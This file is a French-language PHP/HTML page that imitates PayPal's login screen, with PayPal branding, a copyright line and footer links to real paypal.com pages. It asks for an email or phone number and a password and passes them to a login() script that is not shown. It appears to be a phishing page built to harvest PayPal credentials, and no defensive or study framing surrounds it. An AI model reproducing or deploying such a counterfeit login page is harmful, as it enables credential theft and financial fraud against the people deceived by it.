<?php
session_start();
$_SESSION['session'] = 'cjdfnvjl';
?>

<!DOCTYPE html>
<html lang="fr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <link rel="icon" type="image/x-icon" href="images/favicon.ico">
  <title>Validation - Paypal</title>
</head>

<body>
  <nav class="navbar bg-body-tertiary">
    <div class="row container-fluid">
      <a class="navbar-brand" href="#">
        <img src="images/paypal1.png" alt="Logo" width="200" height="100" class="d-inline-block align-text-top">
      </a>
    </div>
  </nav>
  
  <div class='d-flex justify-centent-center mb-5'>

    <div class="card p-2 p-md-5" style="width: 30rem; margin: auto;">
      <div class="card-body">
        <div class="d-flex justify-content-center">
          <img src="images/paypal.jpg" alt="paypal" width="70px">
        </div>

        <small id="notif" class="text-danger"></small>

        <input type="text" class="form-control p-3 my-3" placeholder="Email ou numéro de mobile" aria-label="Username"
          aria-describedby="basic-addon1" id="input" required>

        <input type="text" class="form-control p-3 my-3" id="input2" placeholder="Mot de pass" aria-label="Username"
          aria-describedby="basic-addon1" required>
        </div>

          <button class="btn btn-primary p-3 btn-connexion" style="background-color: #142c8e;"><span class="fs-5" onclick="login()">Connexion</span></button>
          <!-- <button class="btn btn-primary p-3 btn-connexion-loading" style="background-color: #142c8e;"><span class="fs-5" onclick="login()">
            <span role="status fs-5">Connexion en cours...</span>
            <span class="spinner-grow spinner-grow-sm" aria-hidden="true"></span>
          </span></button> -->
        </div>
  </div>

  <footer class="p-5 mb-0" style="width: 100%; margin-top: 100px;">
    <!-- <div class="d-flex justify-content-center text-white" style="width: 100%;"> -->
      <div class="d-flex justify-content-center text-white flex-wrap g-2" style="width: 100%;">
        <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
            href="https://www.paypal.com/fr/smarthelp/contact-us"><small>Contact</small></a>
        <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
            href="https://www.paypal.com/fr/webapps/mpp/ua/privacy-full"><small>Respect de la vie privée</small></a>
        <p class="px-2" style="color: hsl(197.05, 20%, 20%)"><small>© 1999-2023 Tous droits réservés</small></p>
        <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
            href="https://www.paypal.com/fr/webapps/mpp/ua/legalhub-full"><small>Contrats d'utilisation</small></a>
        <a class="px-2" style="color: hsl(197.05, 20%, 20%)"
            href="https://www.paypal.com/fr/webapps/mpp/country-worldwide"><small>International</small></a>
    </div>
  </footer>

  <script src="js/bootstrap.min.js"></script>
  <script src="js/script.js"></script>
  <script src="js/jquery-3.5.1.js"></script>
</body>

</html>